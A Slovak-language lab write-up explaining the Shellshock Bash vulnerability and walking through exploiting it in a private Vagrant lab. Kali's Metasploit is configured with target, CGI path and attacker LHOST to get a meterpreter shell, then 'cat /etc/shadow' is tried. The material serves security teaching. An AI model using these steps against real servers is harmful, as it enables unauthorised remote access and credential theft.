# Otestovanie zraniteľnosti Shellshock na Ubuntu 14.04

CVE-2014-6271, známe aj ako „Shellshock“, bolo objavené v septembri 2014 bezpečnostným výskumníkom Stéphane Chazelasom.
Využíva chybu v príkazovom interpretery Bash od verzie 1.14 po 4.3. Zraniteľné boli všetky zariadenia,
ktoré ho používali. Vzdialenému útoku boli však vystavení iba používatelia, ktorí boli pripojení na internet. Okrem
toho je potrebný určitý softvér, ktorý poskytuje cestu, cez ktorú sa útočník môže dostať k príkazovému interpreteru
Bash, napríklad pri webovom serveri Apache je to CGI, ktorý slúži na interakciu s jeho programami. Experti
vypočítali, že „Shellshock“ sa týkal vyše 500 miliónov zariadení.

Zraniteľnosť vzniká kvôli chybe v spracovaní premenných prostredia v príkazovom interpretery Bash, najmä definície
funkcií. Toto sa dá zneužiť na vykonanie ľubovoľného kódu, získanie neoprávneného prístupu k systému, poprípade
vykonanie rôznych útokov, ako napríklad DoS, Code Injection alebo Remote Command Execution.

## Konfigurácia Ubuntu

Pre otestovanie sme si stiahli verziu webového servera Apache verzie 2.4.7 a overili verziu príkazového interpreteru
Bash, ktorá bola verzie 4.3.8. Následne sme si vytvorili a vložili na server CGI skript, konkrétne `hw.sh`. V súbore
VAGRANT sme si vybrali vhodný systém na stiahnutie, nastavili adresu IP, stiahli a nakonfigurovali webový server
Apache tak aby bolo možné spúšťať súbory CGI. Nakoniec sme vložili skript `hw.sh` a nastavili ho na spustiteľný.

## Konfigurácia Kali Linux

Pre zaútočenie sme si vložili súbor `set-msfconsole.rc` a `HACK.sh` na plochu distribúcie. Útok spustíme otvorením konzoly a spustením príkazu:

```shell
./Desktop/HACK.sh
```

`HACK.sh` nám otvorí v konzole nástroj msfconsole pomocou súboru `set-msfconsole.rc`. V ňom sa nastaví IP zraniteľnej mašiny pomocou
`set RHOSTS 192.168.50.20` a cesta `set TARGETURI /cgi-bin/hw.sh`, čo nám nastaví cestu k skriptu CGI.
Ostáva nám nastaviť IP útočníka `set LHOST 192.168.50.21` a spustiť útok. 

Po spustení `HACK.sh` sme sa dostali do interpretačného riadku meterpreter, kde sme mohli spustiť `shell` a vypísať
si, pomocou príkazu `cat /etc/shadow`, obsah súboru shadow. V tom nám však systém zabráni, pretože nemáme privilégiá *root*.
